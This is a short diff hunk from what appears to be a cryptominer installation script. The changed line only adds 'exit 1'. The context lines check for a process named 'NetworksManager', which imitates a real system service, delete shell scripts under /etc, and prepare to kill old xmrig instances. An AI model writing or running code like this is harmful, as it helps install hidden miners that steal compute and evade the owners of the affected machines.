@@ -11,6 +11,7 @@ if [[ $(ps -ef | grep NetworksManager | grep .NetworksManager | grep ./NetworksM
     	rm -r /etc/e.sh
 	rm -r /etc/*.sh.*
     exit
+    exit 1
 fi
 
 # kill old instances of xmrig
